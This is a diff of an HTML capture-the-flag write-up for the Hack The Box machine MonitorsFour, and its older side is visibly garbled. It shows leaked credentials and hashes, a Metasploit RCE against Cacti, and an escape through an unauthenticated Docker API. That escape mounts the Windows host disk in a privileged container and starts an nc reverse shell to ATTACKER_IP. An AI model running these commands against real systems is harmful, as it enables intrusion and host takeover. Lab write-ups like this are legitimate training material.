@@ -3,45 +3,12 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>MonitorsFour — HTB (Easy) • HTB Writeup</title>
+    <title>MonitorsFour • HTB Writeup</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0b0d15;
-            color: #e0e5f0;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 2rem;
-        }
-        .container {
-            max-width: 1200px;
-            width: 100%;
-            background: rgba(12, 16, 28, 0.9);
-            border: 1px solid rgba(0, 255, 200, 0.15);
-            border-radius: 2rem;
-            padding: 3rem;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
-        }
-        h1 {
-            font-size: 2.5rem;
-            color: #6fffe0;
-            margin-bottom: 1.5rem;
-        }
-        .meta-info {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 1rem 2rem;
-            padding: 1rem;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 1rem;
-            margin-bottom: 2rem;
-        }
-        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
-        .meta-info strong { color: #e0e5f0; }
-        
+        body { background: #0b0d15; color: #e0e5f0; font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem; }
+        .container { max-width: 1200px; width: 100%; background: rgba(12, 16, 28, 0.9); border: 1px solid rgba(0, 255, 200, 0.15); border-radius: 2rem; padding: 3rem; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7); }
+        h1 { font-size: 2.5rem; color: #6fffe0; margin-bottom: 1.5rem; }
         h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
         h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
         h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
@@ -49,197 +16,126 @@
         code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
         pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
         pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .meta-info { display: flex; flex-wrap: wrap; gap: 1rem 2rem; padding: 1rem; background: rgba(0, 0, 0, 0.2); border-radius: 1rem; margin-bottom: 2rem; }
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
         .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
         .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
         .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
-        .box.danger { border-left-color: #ff4444; background: rgba(255, 68, 68, 0.03); }
-        .box.info { border-left-color: #4a9eff; background: rgba(74, 158, 255, 0.03); }
         table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
         table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
         table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
         ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
         ul li { margin-bottom: 0.5rem; line-height: 1.6; }
-        
-        .ascii-art {
-            text-align: center;
-            opacity: 0.3;
-            font-size: 0.5rem;
-            line-height: 1.2;
-            color: #6fffe0;
-            overflow-x: auto;
-            margin: 1.5rem 0;
-        }
         .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
         .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
         .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
         .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
         .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
-        
-        .cve-tag {
-            display: inline-block;
-            background: rgba(255, 0, 0, 0.15);
-            color: #ff6666;
-            padding: 0.2rem 0.8rem;
-            border-radius: 20px;
-            font-size: 0.8rem;
-            font-weight: 600;
-            margin-right: 0.5rem;
-        }
-        .highlight {
-            background: rgba(0, 255, 200, 0.05);
-            border: 1px solid rgba(0, 255, 200, 0.1);
-            border-radius: 0.5rem;
-            padding: 0.5rem 1rem;
-            margin: 0.5rem 0;
-        }
-        .attack-chain {
-            background: rgba(0, 255, 200, 0.02);
-            border: 1px solid rgba(0, 255, 200, 0.1);
-            border-radius: 1rem;
-            padding: 1.5rem;
-            margin: 1rem 0;
-            font-family: 'Courier New', monospace;
-            font-size: 0.85rem;
-            color: #b6c8e0;
-            line-height: 1.8;
-            overflow-x: auto;
-        }
+        .attack-chain { background: rgba(0, 255, 200, 0.02); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; margin: 1rem 0; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #b6c8e0; line-height: 1.8; overflow-x: auto; }
     </style>
 </head>
 <body>
-
 <div class="container">
-    
     <div class="meta-info">
         <span><strong>Machine:</strong> MonitorsFour</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> </span>
-        <span><strong>OS:</strong> Linux</span>
+        <span><strong>Difficulty:</strong> Easy</span>
+        <span><strong>OS:</strong> Windows 11 Pro (Docker)</span>
+        <span><strong>Domain:</strong> monitorsfour.htb</span>
     </div>
-MonitorsFour — HTB (Easy)</h1>
 
-<div class="box">**IP:** `TARGET_IP`</div>
-<div class="box">**Domain:** `monitorsfour.htb`</div>
-<div class="box">**Host OS:** Windows 11 Pro (Docker Desktop running Linux containers)</div>
-<div class="box">**Difficulty:** Easy</div>
+    <h1>🚀 HTB MonitorsFour - Complete Walkthrough</h1>
 
-<hr />
+    <h2>📋 Attack Chain Overview</h2>
+    <div class="attack-chain">
+        <pre>Nmap → Port 80, 5985
+   → .env leak → DB credentials
+   → Virtual host discovery → cacti.monitorsfour.htb
+   → Cacti 1.2.28 unauthenticated RCE (CVE-2025-66399)
+   → Reverse shell in container
+   → Docker API on 2375 (unauthenticated)
+   → Privileged container with host disk mount
+   → Read root flag from Windows host</pre>
+    </div>
 
-<h2>1. Initial Reconnaissance</h2>
+    <h2>🔍 Reconnaissance</h2>
 
-<h3>1.1 Nmap</h3>
-<p>Relevant open ports:</p>
+    <h3>Nmap Scan</h3>
+    <pre><code>80/tcp    open  http    nginx
+5985/tcp  open  http    Microsoft HTTPAPI httpd 2.0</code></pre>
 
-<pre><code>80/tcp    open  http    nginx
-5985/tcp  open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code></pre>
+    <h3>Add to /etc/hosts</h3>
+    <pre><code>echo "TARGET_IP monitorsfour.htb" | sudo tee -a /etc/hosts</code></pre>
 
-<h3>1.2 Add host entry</h3>
-<pre><code># What it does: add the target IP and domain to the local hosts file.
-# Why here: ensure proper resolution for domain-based virtual host discovery.
-echo "TARGET_IP monitorsfour.htb" | sudo tee -a /etc/hosts</code></pre>
+    <p>Possible email target: <code>sales@monitorsfour.htb</code></p>
 
-<p>Possible email target spotted on the site:</p>
-<pre><code>sales@monitorsfour.htb</code></pre>
+    <h2>🌐 Web Enumeration</h2>
 
-<hr />
+    <h3>Directory Fuzzing</h3>
+    <pre><code>ffuf -u http://monitorsfour.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt</code></pre>
 
-<h2>2. Web Enumeration</h2>
+    <h3>API Fuzzing</h3>
+    <pre><code>ffuf -u http://monitorsfour.htb/api/v1/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt</code></pre>
 
-<h3>2.1 Directory fuzzing</h3>
-<pre><code># What it does: fuzz the web root for common directories.
-# Why here: identify potential entry points or exposed application paths like /api or /cacti.
-ffuf -u http://monitorsfour.htb/FUZZ \
-  -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt</code></pre>
+    <p>Endpoints found:</p>
+    <ul>
+        <li><code>auth</code> [Status: 405]</li>
+        <li><code>logout</code> [Status: 302]</li>
+        <li><code>user</code> [Status: 200]</li>
+        <li><code>users</code> [Status: 200]</li>
+    </ul>
 
-<h3>2.2 API fuzzing</h3>
-<pre><code># What it does: fuzz the API endpoints for hidden functionality.
-# Why here: find unprotected or leaked API routes that might expose sensitive data like user hashes or tokens.
-ffuf -u http://monitorsfour.htb/api/v1/FUZZ \
-  -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt</code></pre>
-
-<p>Endpoints found:</p>
-<pre><code>auth      [Status: 405]
-logout    [Status: 302]
-user      [Status: 200]
-users     [Status: 200]</code></pre>
-
-<h3>2.3 Information leak: `.env`</h3>
-<p>Leaks database credentials:</p>
-<pre><code>DB_HOST=mariadb
+    <h3>Information Leak: <code>.env</code></h3>
+    <div class="box success">
+        <pre><code>DB_HOST=mariadb
 DB_PORT=3306
 DB_NAME=monitorsfour_db
 DB_USER=monitorsdbuser
 DB_PASS=f37p2j8f4t0r</code></pre>
+    </div>
 
-<h3>2.4 Virtual-host enumeration</h3>
-<pre><code># What it does: enumerate virtual hosts using Gobuster.
-# Why here: discover subdomains like cacti.monitorsfour.htb that point to internal apps.
-gobuster vhost -u http://monitorsfour.htb \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  --append-domain</code></pre>
+    <h3>Virtual Host Discovery</h3>
+    <pre><code>gobuster vhost -u http://monitorsfour.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</code></pre>
+    <p>Result: <code>cacti.monitorsfour.htb</code></p>
 
-<p>Result:</p>
-<pre><code>cacti.monitorsfour.htb  Status: 302 [Size: 0] [--> /cacti]</code></pre>
+    <h2>🎯 Exploitation — Cacti 1.2.28</h2>
 
-<hr />
+    <p>Vulnerable to <strong>unauthenticated RCE</strong> (CVE-2025-66399 / SNMP command-injection chain).</p>
 
-<h2>3. Exploitation — Cacti 1.2.28</h2>
+    <h3>Fuzzing <code>/cacti</code></h3>
+    <pre><code>ffuf -u "http://cacti.monitorsfour.htb/cacti/FUZZ" -H "Host: cacti.monitorsfour.htb" -w /usr/share/wordlists/dirb/common.txt -fs 0 -t 50 -c</code></pre>
 
-<p>The identified version is vulnerable to <strong>unauthenticated RCE</strong> (CVE-2025-66399 / SNMP command-injection chain).</p>
+    <h3>Deeper Fuzzing with Extensions</h3>
+    <pre><code>ffuf -u "http://cacti.monitorsfour.htb/cacti/FUZZ" -H "Host: cacti.monitorsfour.htb" -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -e .php,.txt,.bak,.old,.sql,.env -c -t 50 -fw 1,604</code></pre>
 
-<h3>3.1 Fuzzing `/cacti`</h3>
-<pre><code># What it does: fuzz the /cacti/ directory for common files.
-# Why here: search for leaked configuration or backup files within the Cacti installation.
-ffuf -u "http://cacti.monitorsfour.htb/cacti/FUZZ" \
-  -H "Host: cacti.monitorsfour.htb" \
-  -w /usr/share/wordlists/dirb/common.txt \
-  -fs 0 -t 50 -c</code></pre>
+    <p>Discovered: <code>http://cacti.monitorsfour.htb/cacti/cacti.sql</code></p>
 
-<h3>3.2 Deeper fuzzing with extensions</h3>
-<pre><code># What it does: perform intensive fuzzing with multiple file extensions.
-# Why here: discover sensitive configuration or database dump files like cacti.sql that might contain cleartext credentials.
-ffuf -u "http://cacti.monitorsfour.htb/cacti/FUZZ" \
-  -H "Host: cacti.monitorsfour.htb" \
-  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
-  -e .php,.txt,.bak,.old,.sql,.env \
-  -c -t 50 -fw 1,604</code></pre>
-
-<p>Discovered: <code>http://cacti.monitorsfour.htb/cacti/cacti.sql</code></p>
-
-<h3>3.3 SQL dump analysis</h3>
-
-<p><strong>Plaintext SNMP v3 credentials</strong> (<code>automation_snmp_items</code> table):</p>
-<pre><code>user:     admin
+    <h3>SQL Dump Analysis</h3>
+    <p><strong>Plaintext SNMP v3 credentials</strong> (<code>automation_snmp_items</code> table):</p>
+    <div class="box success">
+        <pre><code>user:     admin
 password: baseball</code></pre>
+    </div>
 
-<p><strong>User hashes</strong> (<code>user_auth</code>):</p>
-<pre><code>admin  :  21232f297a57a5a743894a0e4a801fc3   (MD5 of "admin")
+    <p><strong>User hashes</strong> (<code>user_auth</code>):</p>
+    <pre><code>admin  :  21232f297a57a5a743894a0e4a801fc3   (MD5 of "admin")
 guest  :  43e9a4ab75570f5b                   (enabled!)</code></pre>
 
-<h3>3.4 Leaking users through the API</h3>
-<pre><code># What it does: query the user endpoint with a null token.
-# Why here: exploit an IDOR vulnerability in the API to dump all registered user hashes for offline cracking.
-curl -s "http://monitorsfour.htb/usertoken=0"</code></pre>
-
-<p>Returns all users with their MD5 hashes:</p>
-<pre><code>admin       : 56b32eb43e6f15395f6c46c1c9e1cd36
+    <h3>Leaking Users through the API</h3>
+    <pre><code>curl -s "http://monitorsfour.htb/usertoken=0"</code></pre>
+    <p>Returns all users with MD5 hashes:</p>
+    <pre><code>admin       : 56b32eb43e6f15395f6c46c1c9e1cd36
 mwatson     : 69196959c16b26ef00b77d82cf6eb169
 janderson   : 2a22dcf99190c322d974c8df5ba3256b
 dthompson   : 8d4a7e7fd08555133e056d9aacb1e519</code></pre>
+    <p>Cracked admin hash: <code>admin : wonderful1</code></p>
+    <p>Generated API token: <code>f54b3c9a7fb6fe6ae7</code></p>
 
-<p>Cracked admin hash:</p>
-<pre><code>admin : wonderful1</code></pre>
+    <h3>Login to Cacti</h3>
+    <p>Reusing credentials: <strong><code>marcus:wonderful1</code></strong> → access to <code>cacti.monitorsfour.htb</code>.</p>
 
-<p>Generated API token: <code>f54b3c9a7fb6fe6ae7</code></p>
-
-<h3>3.5 Login to Cacti</h3>
-<p>Reusing credentials: <strong><code>marcus:wonderful1</code></strong> → access to <code>cacti.monitorsfour.htb</code>.</p>
-
-<hr />
-
-<h2>4. RCE with Metasploit</h2>
-
-<pre><code>msfconsole
+    <h2>💻 RCE with Metasploit</h2>
+    <pre><code>msfconsole
 use multi/http/cacti_graph_template_rce
 set RHOSTS cacti.monitorsfour.htb
 set VHOST  cacti.monitorsfour.htb
@@ -250,40 +146,28 @@ sessions -i 1
 shell
 /bin/bash -i</code></pre>
 
-<hr />
+    <h2>🐳 Container Escape → Windows Host</h2>
 
-<h2>5. Container Escape → Windows Host</h2>
-
-<h3>5.1 Environment check</h3>
-<pre><code># What it does: check for the presence of the .dockerenv file.
-# Why here: confirm if the current shell is running inside a Docker container.
-ls /.dockerenv
-# What it does: audit the process capabilities.
-# Why here: determine if the container has privileged capabilities like CAP_SYS_ADMIN that enable an escape.
+    <h3>Environment Check</h3>
+    <pre><code>ls /.dockerenv
 cat /proc/self/status | grep CapEff
-# What it does: check for the Docker socket file.
-# Why here: identify a potential container escape vector through host socket mounting.
 ls -la /var/run/docker.sock</code></pre>
 
-<h3>5.2 Open ports inside the container</h3>
-<pre><code>netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null</code></pre>
-<p>Detects:</p>
-<pre><code>tcp  LISTEN  0  4096  *:9000  *:*</code></pre>
+    <h3>Open Ports Inside the Container</h3>
+    <pre><code>netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null</code></pre>
+    <p>Detects: <code>tcp  LISTEN  0  4096  *:9000  *:*</code></p>
 
-<h3>5.3 Unauthenticated Docker API</h3>
-<pre><code># What it does: probe the unauthenticated Docker API.
-# Why here: verify if the Docker management port is exposed and identify running containers and images.
-curl http://DOCKER_HOST_IP:2375/version
+    <h3>Unauthenticated Docker API</h3>
+    <pre><code>curl http://DOCKER_HOST_IP:2375/version
 curl http://DOCKER_HOST_IP:2375/containers/json</code></pre>
+    <p>Reveals project path on host:</p>
+    <div class="box success">
+        <pre><code>"com.docker.compose.project.working_dir": "C:\\Users\\Administrator\\Documents\\docker_setup"</code></pre>
+    </div>
 
-<p>The metadata reveals the project path on the host:</p>
-<pre><code>"com.docker.compose.project.working_dir": "C:\\Users\\Administrator\\Documents\\docker_setup"</code></pre>
-
-<h3>5.4 Create a privileged container with full disk mount</h3>
-<pre><code># What it does: create a new privileged container via the Docker API.
-# Why here: leverage the unauthenticated Docker access to mount the host's C:\ drive into a new container for full host compromise.
-curl -X POST -H "Content-Type: application/json" \
-  http://DOCKER_HOST_IP:2375/containers/createname=pwned \
+    <h3>Create a Privileged Container with Full Disk Mount</h3>
+    <pre><code>curl -X POST -H "Content-Type: application/json" \
+  http://DOCKER_HOST_IP:2375/containers/create?name=pwned \
   -d '{
     "Image": "alpine:latest",
     "Cmd": ["sleep", "infinity"],
@@ -291,92 +175,42 @@ curl -X POST -H "Content-Type: application/json" \
       "Privileged": true,
       "Binds": ["/mnt/host/c/:/mnt/windows"]
     }
-  }'</code></pre>
+  }'
 
-<h3>5.5 Start the container</h3>
-<pre><code># What it does: activate the privileged container.
-# Why here: trigger the mount process that exposes the host's Windows partition.
 curl -X POST http://DOCKER_HOST_IP:2375/containers/pwned/start</code></pre>
 
-<h3>5.6 Verify the mount</h3>
-<pre><code># What it does: list the host's Windows directory via the container API.
-# Why here: verify that the C:\ drive mount is successful and that we have administrative access to host files.
-curl -X POST -H "Content-Type: application/json" \
+    <h3>Verify the Mount</h3>
+    <pre><code>curl -X POST -H "Content-Type: application/json" \
   http://DOCKER_HOST_IP:2375/containers/pwned/exec \
-  -d '{
-    "Cmd": ["ls", "-la", "/mnt/windows/Users"],
-    "AttachStdout": true,
-    "AttachStderr": true
-  }'</code></pre>
+  -d '{"Cmd": ["ls", "-la", "/mnt/windows/Users"], "AttachStdout": true, "AttachStderr": true}'</code></pre>
 
-<h3>What it does: execute a reverse shell from the privileged container.</h3>
-<h1>MonitorsFour — HTB (Easy)</h1>
+    <h3>Execute Reverse Shell from Privileged Container</h3>
+    <pre><code>EXEC_ID=$(curl -s -X POST -H "Content-Type: application/json" \
+  http://DOCKER_HOST_IP:2375/containers/pwned/exec \
+  -d '{"Cmd": ["nc", "ATTACKER_IP", "5555", "-e", "/bin/sh"], "AttachStdout": true, "AttachStderr": true}' \
+  | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
 
-    <div class="meta-info">
-        <span><strong>Machine:</strong> MonitorsFour</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> </span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-Why here: obtain an interactive root shell from within the newly created container to finish the host escape.</h1>
-<p>EXEC_ID=$(curl -s -X POST -H "Content-Type: application/json" \</p>
-<p>  http://DOCKER_HOST_IP:2375/containers/pwned/exec \</p>
-<p>  -d '{"Cmd": ["nc", "ATTACKER_IP", "5555", "-e", "/bin/sh"], "AttachStdout": true, "AttachStderr": true}' \</p>
-<table>
-  <tr>
-    <th>grep -o '"Id":"[^"]*"'</th>
-    <th>cut -d'"' -f4)</th>
-  </tr>
-</table>
+curl -X POST -H "Content-Type: application/json" \
+  "http://DOCKER_HOST_IP:2375/exec/$EXEC_ID/start" \
+  -d '{"Detach": false, "Tty": false}' --no-buffer &</code></pre>
 
-<p>curl -X POST -H "Content-Type: application/json" \</p>
-<p>  "http://DOCKER_HOST_IP:2375/exec/$EXEC_ID/start" \</p>
-<p>  -d '{"Detach": false, "Tty": false}' --no-buffer &</p>
-<pre><code>
-### 5.8 Reading the flag</code></pre>
-<h1>MonitorsFour — HTB (Easy)</h1>
+    <h3>Reading the Flag</h3>
+    <pre><code>df -h | grep windows
+cat /mnt/windows/Users/Administrator/Desktop/root.txt</code></pre>
 
-    <div class="meta-info">
-        <span><strong>Machine:</strong> MonitorsFour</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> </span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-What it does: verify the host disk mount.</h1>
-<h1>MonitorsFour — HTB (Easy)</h1>
+    <h2>📊 Key Takeaways</h2>
+    <ul>
+        <li><strong>Always check vulnerable versions</strong> — Cacti 1.2.28 → public RCE.</li>
+        <li><strong>Docker API on 2375/tcp without TLS</strong> = trivial host RCE.</li>
+        <li><strong>On Docker Desktop for Windows</strong>, <code>/mnt/host/c/</code> maps to host <code>C:\</code>.</li>
+        <li><strong>Privileged: true + host disk bind</strong> = game over.</li>
+    </ul>
 
-    <div class="meta-info">
-        <span><strong>Machine:</strong> MonitorsFour</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> </span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-Why here: confirm the Windows C:\ drive is accessible inside the container.</h1>
-<p>df -h | grep windows</p>
-<h1>MonitorsFour — HTB (Easy)</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> MonitorsFour</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> </span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-What it does: read the root flag from the Administrator's desktop.</h1>
-<h1>MonitorsFour — HTB (Easy)</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> MonitorsFour</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> </span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-Why here: fulfill the final objective after successful host filesystem access.</h1>
-<p>cat /mnt/windows/Users/Administrator/Desktop/root.txt</p>
     <div class="nav-buttons">
         <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
     </div>
     <div class="footer">NIGHT PULSE X • 2026</div>
 </div>
-
 </body>
 </html>
+
